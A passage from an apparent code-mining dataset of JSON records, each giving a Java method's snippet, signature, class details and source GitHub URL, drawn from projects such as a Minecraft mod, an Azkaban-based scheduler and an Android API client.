"https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/security/filter/ValidateCodeUtil.java", "stars": "6", "class": {"name": "ValidateCodeUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "verifyCaptcha", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean verifyCaptcha(String key, String value) {        ICaptcha iCaptcha = cache.get(key);        return iCaptcha != null && iCaptcha.verify(value);    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/security/filter/ValidateCodeUtil.java", "stars": "6", "class": {"name": "ValidateCodeUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getCount ()\t{\t\treturn n_getCount ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchViewAdapter.java", "stars": "2", "class": {"name": "ShellSearchViewAdapter", "extends": "android", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_getCount", "params": [], "throws": null, "modifiers": ["native", "private"], "return_type": "int", "snippet": "\tprivate native int n_getCount ();\tpublic java.lang.Object getItem (int p0)\t{\t\treturn n_getItem (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchViewAdapter.java", "stars": "2", "class": {"name": "ShellSearchViewAdapter", "extends": "android", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "getItem", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "java", "snippet": "\tpublic java.lang.Object getItem (int p0)\t{\t\treturn n_getItem (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchViewAdapter.java", "stars": "2", "class": {"name": "ShellSearchViewAdapter", "extends": "android", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_getItem", "params": ["int"], "throws": null, "modifiers": ["native", "private"], "return_type": "java", "snippet": "\tprivate native java.lang.Object n_getItem (int p0);\tpublic long getItemId (int p0)\t{\t\treturn n_getItemId (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchViewAdapter.java", "stars": "2", "class": {"name": "ShellSearchViewAdapter", "extends": "android", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "getItemId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "\tpublic long getItemId (int p0)\t{\t\treturn n_getItemId (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchViewAdapter.java", "stars": "2", "class": {"name": "ShellSearchViewAdapter", "extends": "android", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_getItemId", "params": ["int"], "throws": null, "modifiers": ["native", "private"], "return_type": "long", "snippet": "\tprivate native long n_getItemId (int p0);\tpublic android.view.View getView (int p0, android.view.View p1, android.view.ViewGroup p2)\t{\t\treturn n_getView (p0, p1, p2);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchViewAdapter.java", "stars": "2", "class": {"name": "ShellSearchViewAdapter", "extends": "android", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "getView", "params": ["int", "android", "android"], "throws": null, "modifiers": ["public"], "return_type": "android", "snippet": "\tpublic android.view.View getView (int p0, android.view.View p1, android.view.ViewGroup p2)\t{\t\treturn n_getView (p0, p1, p2);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchViewAdapter.java", "stars": "2", "class": {"name": "ShellSearchViewAdapter", "extends": "android", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_getView", "params": ["int", "android", "android"], "throws": null, "modifiers": ["native", "private"], "return_type": "android", "snippet": "\tprivate native android.view.View n_getView (int p0, android.view.View p1, android.view.ViewGroup p2);\tpublic android.widget.Filter getFilter ()\t{\t\treturn n_getFilter ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchViewAdapter.java", "stars": "2", "class": {"name": "ShellSearchViewAdapter", "extends": "android", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "getFilter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "android", "snippet": "\tpublic android.widget.Filter getFilter ()\t{\t\treturn n_getFilter ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchViewAdapter.java", "stars": "2", "class": {"name": "ShellSearchViewAdapter", "extends": "android", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_getFilter", "params": [], "throws": null, "modifiers": ["native", "private"], "return_type": "android", "snippet": "\tprivate native android.widget.Filter n_getFilter ();\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchViewAdapter.java", "stars": "2", "class": {"name": "ShellSearchViewAdapter", "extends": "android", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchViewAdapter.java", "stars": "2", "class": {"name": "ShellSearchViewAdapter", "extends": "android", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchViewAdapter.java", "stars": "2", "class": {"name": "ShellSearchViewAdapter", "extends": "android", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "createOutputPropsFile", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "  public File createOutputPropsFile(final String id, final String workingDir) {    this.info(\"cwd=\" + workingDir);    final File directory = new File(workingDir);    File tempFile = null;    try {      tempFile = File.createTempFile(id + \"_output_\", \"_tmp\", directory);    } catch (final IOException e) {      this.error(\"Failed to create temp output property file :\", e);      throw new RuntimeException(\"Failed to create temp output property file \",          e);    }    return tempFile;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getJobProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props getJobProps() {    return this.jobProps;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getSysProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props getSysProps() {    return this.sysProps;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getJobPath", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getJobPath() {    return this._jobPath;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "resolveProps", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void resolveProps() {    this.jobProps = PropsUtils.resolveProps(this.jobProps);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "logJobProperties", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void logJobProperties() {    if (this.jobProps != null &&        this.jobProps.getBoolean(JOB_DUMP_PROPERTIES_IN_LOG, false)) {      try {        final Map<String, String> flattenedProps = this.jobProps.getFlattened();        this.info(\"******   Job properties   ******\");        this.info(String.format(\"- Note : value is masked if property name ends with '%s'.\",            SENSITIVE_JOB_PROP_NAME_SUFFIX));        for (final Map.Entry<String, String> entry : flattenedProps.entrySet()) {          final String key = entry.getKey();          final String value = key.endsWith(SENSITIVE_JOB_PROP_NAME_SUFFIX) ?              SENSITIVE_JOB_PROP_VALUE_PLACEHOLDER :              entry.getValue();          this.info(String.format(\"%s=%s\", key, value));        }        this.info(\"****** End Job properties  ******\");      } catch (final Exception ex) {        this.log.error(\"failed to log job properties \", ex);      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getJobGeneratedProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props getJobGeneratedProperties() {    return this.generatedProperties;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "initPropsFiles", "params": [], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "  public File[] initPropsFiles() {    // Create properties file with additionally all input generated properties.    final File[] files = new File[2];    files[0] = createFlattenedPropsFile(this._cwd);    this.jobProps.put(ENV_PREFIX + JOB_PROP_ENV, files[0].getAbsolutePath());    this.jobProps.put(ENV_PREFIX + JOB_NAME_ENV, getId());    files[1] = this.createOutputPropsFile(getId(), this._cwd);    this.jobProps.put(ENV_PREFIX + JOB_OUTPUT_PROP_FILE, files[1].getAbsolutePath());    return files;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "initOverAllPropsFiles", "params": [], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "  public File initOverAllPropsFiles() {    final File file = createOverAllFlattenedPropsFile(getFlowDirectory());    this.jobProps.put(ENV_PREFIX + JOB_OVERALL_PROP_ENV, file.getAbsolutePath());    return file;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getCwd", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getCwd() {    return this._cwd;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getEnvironmentVariables", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "  public Map<String, String> getEnvironmentVariables() {    final Props props = getJobProps();    final Map<String, String> envMap = props.getMapByPrefix(ENV_PREFIX);    envMap.putAll(props.getMapByPrefix(ENV_PREFIX_UCASE));    return envMap;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getWorkingDirectory", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getWorkingDirectory() {    final String workingDir = getJobProps().getString(WORKING_DIR, this._jobPath);    if (workingDir == null) {      return \"\";    }    return workingDir;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getFlowDirectory", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getFlowDirectory() {    final String flowDir = getJobProps().getString(Flow_DIR, this._jobPath);    if (flowDir == null) {      return \"\";    }    return flowDir;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "loadOutputFileProps", "params": ["File"], "throws": null, "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props loadOutputFileProps(final File outputPropertiesFile) {    InputStream reader = null;    try {      this.info(\"output properties file=\" + outputPropertiesFile.getAbsolutePath());      reader =          new BufferedInputStream(new FileInputStream(outputPropertiesFile));      final Props outputProps = new Props();      final String content = Streams.asString(reader).trim();      if (!content.isEmpty()) {        final Map<String, Object> propMap =            (Map<String, Object>) JSONUtils.parseJSONFromString(content);        for (final Map.Entry<String, Object> entry : propMap.entrySet()) {          outputProps.put(entry.getKey(), entry.getValue().toString());        }      }      return outputProps;    } catch (final FileNotFoundException e) {      this.log.info(String.format(\"File[%s] wasn't found, returning empty props.\",          outputPropertiesFile));      return new Props();    } catch (final Exception e) {      this.log.error(          \"Exception thrown when trying to load output file props.  Returning empty Props instead of failing.  Is this really the best thing to do?\",          e);      return new Props();    } finally {      IOUtils.closeQuietly(reader);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "createFlattenedPropsFile", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "  public File createFlattenedPropsFile(final String workingDir) {    final File directory = new File(workingDir);    File tempFile = null;    try {      // The temp file prefix must be at least 3 characters.      tempFile = File.createTempFile(getId() + \"_props_\", \"_tmp\", directory);      this.jobProps.storeFlattened(tempFile);    } catch (final IOException e) {      throw new RuntimeException(\"Failed to create temp property file \" + directory, e);    }    return tempFile;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "createOverAllFlattenedPropsFile", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "  public File createOverAllFlattenedPropsFile(final String flowDir) {    final File directory = new File(flowDir);    File tempFile = null;    try {      // The temp file prefix must be at least 3 characters.      tempFile = File.createTempFile(\"overall_props_\", \"_tmp\", directory);      this.jobProps.storeFlattened(tempFile);    } catch (final IOException e) {      throw new RuntimeException(\"Failed to create overall temp property file \" + directory, e);    }    return tempFile;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "generateProperties", "params": ["File"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void generateProperties(final File outputFile) {    this.generatedProperties = loadOutputFileProps(outputFile);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/jobExecutor/AbstractProcessJob.java", "stars": "18", "class": {"name": "AbstractProcessJob", "extends": "AbstractJob", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "route", "params": ["TriggerParam", "List<String>"], "throws": null, "modifiers": ["public"], "return_type": "ReturnT<String>", "snippet": "    public ReturnT<String> route(TriggerParam triggerParam, List<String> addressList){        return new ReturnT<String>(addressList.get(0));    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/core/route/strategy/ExecutorRouteFirst.java", "stars": "1", "class": {"name": "ExecutorRouteFirst", "extends": "ExecutorRouter", "implements": null, "modifiers": ["public"]}}, {"method_name": "getHeaders", "params": [], "throws": ["AuthFailureError"], "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "    public Map<String, String> getHeaders() throws AuthFailureError {        if (CredentialsManager.getInstance().hasCredentials()) {            HashMap<String, String> params = new HashMap<>();            Credentials credentials = CredentialsManager.getInstance().getCredentials();            String creds = String.format(\"%s:%s\", credentials.username, credentials.password);            String auth = \"Basic \" + Base64.encodeToString(creds.getBytes(), Base64.DEFAULT);            params.put(\"Authorization\", auth);            params.put(\"x-access-token\", credentials.token);            params.put(\"Content-Type\", \"application/json\");            return params;        }        return Collections.emptyMap();    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/API/CustomRequest.java", "stars": "1", "class": {"name": "CustomRequest", "extends": "JsonObjectRequest", "implements": null, "modifiers": ["public"]}}, {"method_name": "initElements", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\t\telements.blocks.add(() -> new CustomBlock());\t\telements.items.add(() -> new BlockItem(block, new Item.Properties().group(null)).setRegistryName(block.getRegistryName()));\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedPaeoniaBlock.java", "stars": "2", "class": {"name": "PottedPaeoniaBlock", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "clientLoad", "params": ["FMLClientSetupEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void clientLoad(FMLClientSetupEvent event) {\t\tRenderTypeLookup.setRenderLayer(block, RenderType.getCutout());\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedPaeoniaBlock.java", "stars": "2", "class": {"name": "PottedPaeoniaBlock", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "isNormalCube", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean isNormalCube(BlockState state, IBlockReader worldIn, BlockPos pos) {\t\t\treturn false;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedPaeoniaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "propagatesSkylightDown", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean propagatesSkylightDown(BlockState state, IBlockReader reader, BlockPos pos) {\t\t\treturn true;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedPaeoniaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getShape", "params": ["BlockState", "IBlockReader", "BlockPos", "ISelectionContext"], "throws": null, "modifiers": ["public"], "return_type": "VoxelShape", "snippet": "\t\tpublic VoxelShape getShape(BlockState state, IBlockReader world, BlockPos pos, ISelectionContext context) {\t\t\treturn VoxelShapes.create(0.312D, 0D, 0.312D, 0.688D, 0.375D, 0.688D);\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedPaeoniaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "tickRate", "params": ["IWorldReader"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\tpublic int tickRate(IWorldReader world) {\t\t\treturn 0;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedPaeoniaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getPickBlock", "params": ["BlockState", "RayTraceResult", "IBlockReader", "BlockPos", "PlayerEntity"], "throws": null, "modifiers": ["public"], "return_type": "ItemStack", "snippet": "\t\tpublic ItemStack getPickBlock(BlockState state, RayTraceResult target, IBlockReader world, BlockPos pos, PlayerEntity player) {\t\t\treturn new ItemStack(PaeoniaBlock.block, (int) (1));\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedPaeoniaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getMaterialColor", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "MaterialColor", "snippet": "\t\tpublic MaterialColor getMaterialColor(BlockState state, IBlockReader blockAccess, BlockPos pos) {\t\t\treturn MaterialColor.STONE;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedPaeoniaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getPushReaction", "params": ["BlockState"], "throws": null, "modifiers": ["public"], "return_type": "PushReaction", "snippet": "\t\tpublic PushReaction getPushReaction(BlockState state) {\t\t\treturn PushReaction.DESTROY;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedPaeoniaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getDrops", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\t\t\tif (!dropsOriginal.isEmpty())\t\t\t\treturn dropsOriginal;\t\t\treturn Collections.singletonList(new ItemStack(Blocks.FLOWER_POT, (int) (1)));\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedPaeoniaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "removedByPlayer", "params": ["BlockState", "World", "BlockPos", "PlayerEntity", "boolean", "IFluidState"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean removedByPlayer(BlockState state, World world, BlockPos pos, PlayerEntity entity, boolean willHarvest, IFluidState fluid) {\t\t\tboolean retval = super.removedByPlayer(state, world, pos, entity, willHarvest, fluid);\t\t\tint x = pos.getX();\t\t\tint y = pos.getY();\t\t\tint z = pos.getZ();\t\t\t{\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\t\t\t\t$_dependencies.put(\"x\", x);\t\t\t\t$_dependencies.put(\"y\", y);\t\t\t\t$_dependencies.put(\"z\", z);\t\t\t\t$_dependencies.put(\"world\", world);\t\t\t\tPaeoniaPlayerProcedure.executeProcedure($_dependencies);\t\t\t}\t\t\treturn retval;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedPaeoniaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "onExplosionDestroy", "params": ["World", "BlockPos", "Explosion"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void onExplosionDestroy(World world, BlockPos pos, Explosion e) {\t\t\tsuper.onExplosionDestroy(world, pos, e);\t\t\tint x = pos.getX();\t\t\tint y = pos.getY();\t\t\tint z = pos.getZ();\t\t\t{\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\t\t\t\t$_dependencies.put(\"x\", x);\t\t\t\t$_dependencies.put(\"y\", y);\t\t\t\t$_dependencies.put(\"z\", z);\t\t\t\t$_dependencies.put(\"world\", world);\t\t\t\tPaeoniaExplosionProcedure.executeProcedure($_dependencies);\t\t\t}\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedPaeoniaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "onBlockActivated", "params": ["BlockState", "World", "BlockPos", "PlayerEntity", "Hand", "BlockRayTraceResult"], "throws": null, "modifiers": ["public"], "return_type": "ActionResultType", "snippet": "\t\tpublic ActionResultType onBlockActivated(BlockState state, World world, BlockPos pos, PlayerEntity entity, Hand hand,\t\t\t\tBlockRayTraceResult hit) {\t\t\tsuper.onBlockActivated(state, world, pos, entity, hand, hit);\t\t\tint x = pos.getX();\t\t\tint y = pos.getY();\t\t\tint z = pos.getZ();\t\t\tDirection direction = hit.getFace();\t\t\t{\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\t\t\t\t$_dependencies.put(\"entity\", entity);\t\t\t\t$_dependencies.put(\"x\", x);\t\t\t\t$_dependencies.put(\"y\", y);\t\t\t\t$_dependencies.put(\"z\", z);\t\t\t\t$_dependencies.put(\"world\", world);\t\t\t\tRightClickedPaeoniaProcedure.executeProcedure($_dependencies);\t\t\t}\t\t\treturn ActionResultType.SUCCESS;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedPaeoniaBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "run", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run(){        LOG.info(\"switch status: \" + authConfiguration.enable());        if(authConfiguration.enable()) {            ScheduledExecutorService service = Executors.newSingleThreadScheduledExecutor();            Runnable runnable = () -> {                try {                    refresh();                } catch (Exception e) {                    LOG.error(\"Refresh method happened error\", e);                }            };            service.scheduleAtFixedRate(runnable, 0,                    authConfiguration.authTokenServRefreshInterval(), TimeUnit.SECONDS);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/auth/scheduler/ServTokenRefresh.java", "stars": "23", "class": {"name": "ServTokenRefresh", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "refresh", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void refresh(){        try{            String body = authTokenService.refreshServerToken(authConfiguration.authTokenServRefreshId(),                    authConfiguration.authTokenServRefreshPwd());            if(StringUtils.isNotBlank(body)){                System.setProperty(AuthConstraints.ENV_SERV_TOKEN, body);                LOG.info(\"Get Token:\" + body.substring(0, 12) + \"*******\");                String storePath = authConfiguration.authTokenServRefreshStore();                if(StringUtils.isNotBlank(storePath) && !storePath.equals(TOKEN_NO_STORE_FLAG)){                    storeToken(body, storePath);                    System.setProperty(AuthConstraints.ENV_SERV_TOKEN_PATH, storePath);                }            }        }catch(Exception e){            LOG.info(e.getMessage());        }    }", "url": 